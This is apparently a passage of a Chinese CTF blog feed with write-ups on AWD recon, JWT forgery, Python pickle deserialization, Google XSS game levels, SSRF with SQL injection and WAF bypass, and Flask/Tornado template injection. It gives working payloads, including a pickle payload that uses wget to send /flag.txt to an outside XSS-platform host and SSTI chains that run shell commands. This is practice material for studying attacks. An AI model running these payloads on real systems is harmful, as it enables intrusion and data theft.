<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- url</span><br><span class="line">nmap -A -p- url</span><br><span class="line">python3 dirsearch.py -u &#123;url&#125; -e php</span><br></pre></td></tr></table></figure>

<h2 id="防御侦察"><a href="#防御侦察" class="headerlink" title="防御侦察"></a>防御侦察</h2><p>在文件夹中搜索某个关键字(eval, system, exec… ),找到一句话后门之后立即删除.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -r &quot;eval&quot; /var/www/html</span><br></pre></td></tr></table></figure>

<p>查找被修改的php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查找24小时之内修改的文件</span><br><span class="line">find ./ -mtime -0 -name &quot;*.php&quot;</span><br><span class="line">查找10分钟内被修改的文件</span><br><span class="line">find ./ -mmin -10 -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>

<h2 id="flag读取"><a href="#flag读取" class="headerlink" title="flag读取"></a>flag读取</h2><p>mysql 读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>csrf 题型记录</title>
    <url>/2019/07/14/csrf/</url>
    <content><![CDATA[<p><img src="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png" alt="1563077535097"></p>
<p>脚本找lv6会员</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url+str(i)).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>进去改价格和折扣,把折扣改成很低的一个值就会跳转到一个admin界面,但是要登录admin.</p>
<p>这题用了jwt,先解码再用工具爆破得到了secretkey,然后用这个去伪造admin的jwt,登录.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510982-bd6d1580-aa27-11e9-8e6f-edf56d75bd82.png" alt="1563074249024"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510999-d4136c80-aa27-11e9-8478-25a46b4e985d.png" alt="1563077458061"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511037-f5745880-aa27-11e9-9b44-d3a98d308606.png" alt="1563074188880"></p>
<p>关键的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里是python的反序列化漏洞,脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"wget 'http://xss.buuoj.cn/index.php?do=api&amp;id=Krwr7k' --post-data='location='`cat /flag.txt` -O-"</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">print(urllib.quote(payload))</span><br></pre></td></tr></table></figure>

<p>当序列化的过程中,<code>__reduce__</code>函数描述这个类在反序列化的时候该如何重构,今儿造成了命令执行.</p>
<p>使用xss.buuoj.cn建立内网的xss平台并且监听,然后burp发送payload如下:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511066-12a92700-aa28-11e9-8ddf-65531fc3310b.png" alt="1563076232369"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511084-23f23380-aa28-11e9-90b9-24def8a283d6.png" alt="1563076325322"></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>Google_Game</title>
    <url>/2019/06/12/Google-Game/</url>
    <content><![CDATA[<h1 id="Google-Xss-game"><a href="#Google-Xss-game" class="headerlink" title="Google Xss game"></a>Google Xss game</h1><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png" alt="image"></p>
<p>This website provides some API (after the arch pointer).</p>
<p>solution:</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### level 4</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58806619-2b60a780-8649-11e9-8fa4-2f75a62e5e1b.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function startTimer(seconds) &#123;</span><br><span class="line">        seconds = parseInt(seconds) || 3;</span><br><span class="line">        setTimeout(function() &#123; </span><br><span class="line">          window.confirm(&quot;Time is up!&quot;);</span><br><span class="line">          window.history.back();</span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level4&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;&#123;&#123; timer &#125;&#125;&apos;);&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;</span><br></pre></td></tr></table></figure>

<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p><img src="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png" alt="image"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--signup.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/game-frame.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/game-frame-styles.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"level5"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/logos/level5.png"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"reader-email"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; next &#125;&#125;"</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>solution: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>

<p>and click the <code>Next</code> button.</p>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p><img src="https://user-images.githubusercontent.com/40637063/58806432-c1480280-8648-11e9-8d7f-eb763e2a0757.png" alt="image"></p>
<p>This website allow user to execute alternative js script</p>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#data:text/plain,alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SSRF 题型记录</title>
    <url>/2019/06/05/SSRF/</url>
    <content><![CDATA[<h2 id="2019-De1ctf-shellshellshell"><a href="#2019-De1ctf-shellshellshell" class="headerlink" title="2019 De1ctf shellshellshell"></a>2019 De1ctf shellshellshell</h2><p>这个网站长这样:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png" alt="QQ截图20190806165844"></p>
<p>然后他的api都是</p>
<p>index.php?action=index</p>
<p>index.php?action=publish</p>
<p>index.php?action=logout</p>
<p>之类的</p>
<p>Source code linking: </p>
<p><a href="http://127.0.0.1:8302/view/" target="_blank" rel="noopener">http://127.0.0.1:8302/view/</a>(many source file)</p>
<p>Guess the existence of <code>user.php</code> and <code>config.php</code>,and try several ways to get access to it .</p>
<p><a href="http://127.0.0.1:8302/user.php" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php</a>~<br><a href="http://127.0.0.1:8302/user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.bak</a><br><a href="http://127.0.0.1:8302/user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.swp</a><br><a href="http://127.0.0.1:8302/.user.php" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php</a>~<br><a href="http://127.0.0.1:8302/.user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.bak</a><br><a href="http://127.0.0.1:8302/.user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.swp</a></p>
<p><a href="http://127.0.0.1:8302/config.php" target="_blank" rel="noopener">http://127.0.0.1:8302/config.php</a>~</p>
<p>See exploitment:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signature=1`,`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`),(4,`bbb`,(select concat(username,password) from ctf_users where is_admin=1),`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`)#&amp;mood=0</span><br></pre></td></tr></table></figure>

<p>check the phpinfo( I made this in docker , here might be some error, anyway):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62533827-34a10700-b87a-11e9-88d5-60888db5dc73.png" alt="QQ截图20190806184325"></p>
<p><a href="https://blog.csdn.net/loongwong2011/article/details/52155046" target="_blank" rel="noopener">simple talk about soap,http,tcp,ip</a></p>
<p><img src="https://user-images.githubusercontent.com/40637063/62526153-44651f00-b86b-11e9-91b2-e210de8fb838.png" alt="QQ截图20190806165527"></p>
<h2 id="2018网鼎杯-fakebook"><a href="#2018网鼎杯-fakebook" class="headerlink" title="2018网鼎杯 fakebook"></a>2018网鼎杯 fakebook</h2><p><img src="https://user-images.githubusercontent.com/40637063/61576225-e665d700-ab09-11e9-8a70-de85e976bb8c.png" alt="image"></p>
<p>这里有登录和注册功能.注册的时候除了常规的信息之外还让我们填写了博客地址.填写完之后登录是这样的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576261-583e2080-ab0a-11e9-9736-f2cbc5dc2210.png" alt="image"></p>
<p>点进个人链接会发现页面会尝试去获取博客的内容:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576276-8f143680-ab0a-11e9-826f-ad5c1a505b14.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576271-828fde00-ab0a-11e9-8eaf-ee2787669db0.png" alt="image"></p>
<p>首先发现<code>robots.txt</code> 中有<code>user.php.bak</code>.访问获得源码.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>容易看出,服务端要去访问我们给他传递的博客地址,这里没有任何防护,也就是说存在<code>ssrf</code>漏洞.</p>
<p>通过扫描和盲猜,可以发现<code>flag.php</code>的存在.</p>
<p>那么就可以让本来应该去访问博客的服务端去访问他自己的<code>flag.php</code>.</p>
<p>另外,在内容展示的页面发现了一处注入(参数no):</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576295-fb8f3580-ab0a-11e9-8c28-fd9c6b5277f8.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1%20union%20select%201,1,1,1%23</span><br></pre></td></tr></table></figure>

<p>结果被waf检测到了,那么可以把空格用注释符号来替代:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,1,1,1%23</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/61576335-8e2fd480-ab0b-11e9-9e13-e7952db8439d.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),1)%23</span><br><span class="line"></span><br><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>

<p>然后逐个查看字段的内容,一直到data字段:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(data) from users),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>

<p>回显如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] query error! (XPATH syntax error: &apos;~O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:&apos;)</span><br></pre></td></tr></table></figure>

<p>一个序列化字符串………………….可以想到这里可能是将data字段进行反序列化之后在页面上进行回显.由此而产生的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos; #</span><br></pre></td></tr></table></figure>

<p>而对空格的waf似乎也只是针对union而已.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61576614-ace39a80-ab0e-11e9-9508-2f78be14488a.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61575863-22963900-ab04-11e9-99ee-6f9c76db029d.png" alt="image"></p>
<h2 id="LCTF-2017-签到题"><a href="#LCTF-2017-签到题" class="headerlink" title="LCTF-2017-签到题"></a>LCTF-2017-签到题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!$_GET[&apos;site&apos;])&#123; </span><br><span class="line">	$str = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">look source code: </span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;GET&apos;&gt; </span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; /&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;site&apos; style=&quot;width:1000px&quot; value=&quot;https://www.baidu.com&quot;/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOD;</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;site&apos;]; </span><br><span class="line">$url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[&apos;host&apos;]; </span><br><span class="line">$request_url = $url.&quot;/&quot;; </span><br><span class="line"></span><br><span class="line">if ($host !== &apos;www.baidu.com&apos;)&#123; </span><br><span class="line">	die(&quot;wrong site&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$res = curl_exec($ci);</span><br><span class="line">curl_close($ci);</span><br><span class="line"></span><br><span class="line">if($res)&#123; </span><br><span class="line">	echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; </span><br><span class="line">	echo $request_url; </span><br><span class="line">	echo &quot;&lt;hr /&gt;&quot;; </span><br><span class="line">	echo htmlentities($res); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">	echo &quot;get source failed&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Keypoint:</p>
<ul>
<li>using protocal <code>file</code> to read local file</li>
<li>must bypass the limitation to hostname (must have <code>www.baidu.com</code>), but <code>file://host/path</code> can alse read local file in <code>path</code></li>
<li>to make <code>/</code> useless, just add a <code>?</code> or <code>#</code>.</li>
</ul>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>SSTI 题型记录</title>
    <url>/2019/05/27/SSTI/</url>
    <content><![CDATA[<h3 id="2018护网杯easy-tornado"><a href="#2018护网杯easy-tornado" class="headerlink" title="2018护网杯easy_tornado"></a>2018护网杯easy_tornado</h3><p>tornado SSTI.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png" alt="1562241369585"></p>
<p>Observe the url:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web9.buuoj.cn/file?filename=/hints.txt&amp;filehash=bf60e1051f59dbb931208200bcf8c08e</span><br><span class="line">http://web9.buuoj.cn/file?filename=/flag.txt&amp;filehash=245a5ccf5543f16709d8c22851af5454</span><br><span class="line">http://web9.buuoj.cn/file?filename=/welcome.txt&amp;filehash=1e1439df1c0c7eeb9e93a8e44a58bc9f</span><br></pre></td></tr></table></figure>

<p>click into flag.txt, which shows flag is in /fllllllllllag.</p>
<p>click into welcome.txt , which shows just a word <code>render</code>.</p>
<p>click into hint.txt, which shows filehash are generated by <code>md5(cookie_secret+md5(filename))</code></p>
<p>so , the question is , how to get <code>cookie_secret</code> ?While so many keywords were filtered.</p>
<p>In <code>web.py</code> ,we can see that <code>cookie_secret</code> is in <code>RequestHandler.application.settings</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511171-77fd1800-aa28-11e9-85dc-2ec521c8b955.png" alt="1562248424477"></p>
<p>While in <code>auth.py</code> ,there is an object oriented from <code>RequestHandler</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511187-82b7ad00-aa28-11e9-8efe-48dc206a9f74.png" alt="1562248566424"></p>
<p>Obviously, the <code>filehash</code> should be a trick from auth.py(?)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png" alt="1562240071849"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png" alt="1562240945347"></p>
<blockquote>
<p>Summary: </p>
<p>Learning to develop is so important.!!!</p>
</blockquote>
<h3 id="百度杯-Fuzz"><a href="#百度杯-Fuzz" class="headerlink" title="百度杯 Fuzz"></a>百度杯 Fuzz</h3><p>考察<code>Flask</code> 模板注入。</p>
<p>首先，使用Burpsuit的<code>Intruder</code>模块中的<code>server-side variable name</code> 字典来Fuzz，发现<code>name</code> 参数有端倪。</p>
<p>随便在name参数中输入一点什么，错误信息如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png" alt="image"></p>
<p>大蟒蛇(python) –&gt; Flask 模板注入。。。</p>
<p><code>/?name=1</code> 页面回显<code>Hello 1</code> 然后输入<code>/?name=1</code> 和<code>/?name=</code> 发现也执行了。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) %7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B config.from_pyfile(&apos;/tmp/owned.cfg&apos;) %7D%7D </span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D</span><br></pre></td></tr></table></figure>

<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40]</code> 的函数是<code>file</code> ，这里第一个payload是创建并往<code>/tmp/owned.cfg</code> 写代码。第二个payload是调用文件(Flask 中的用法) 。第三个payload是<code>config[\](&#39;/usr/bin/id&#39;, shell=True)</code> ,(反斜杠是为了markdown中的转义)。</p>
<p>然后尝试<code>name=%7B%7B%20config[%27RUNCMD%27](%27ls%27,shell=True)%20%7D%7D</code>,发现被过滤，于是产生base64编码，最终结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27echo aW1wb3J0IG9zCmZvciAoZGlycGF0aCxkaXJuYW1lLG5hbWUpIGluIG9zLndhbGsoJy92YXIvd3d3L2h0bWwnKToKCXByaW50IG5hbWUKCXByaW50IGRpcnBhdGg=|base64 -d &gt; /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">base64: </span><br><span class="line">import os</span><br><span class="line">for (dirpath,dirname,name) in os.walk(&apos;/var/www/html&apos;):</span><br><span class="line">	print name</span><br><span class="line">	print dirpath</span><br></pre></td></tr></table></figure>

<p><code>name=%7B%7B%20config[%27RUNCMD%27] (%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py%27,shell=True)%20%7D%7D</code> base64码的内容是<code>print open(&#39;/var/www/html/fl4g&#39;,&#39;r&#39;).read()</code> 。</p>
<p>执行py<br><code>name=%7B%7B%20config[%27RUNCMD%27] (%27python /tmp/get.py%27,shell=True)%20%7D%7D</code> </p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>MiscInWeb</title>
    <url>/2019/05/27/MiscInWeb/</url>
    <content><![CDATA[<h1 id="Web-杂项"><a href="#Web-杂项" class="headerlink" title="Web 杂项"></a>Web 杂项</h1><blockquote>
<p>前言: 别看是web杂项,难是真滴难!</p>
</blockquote>
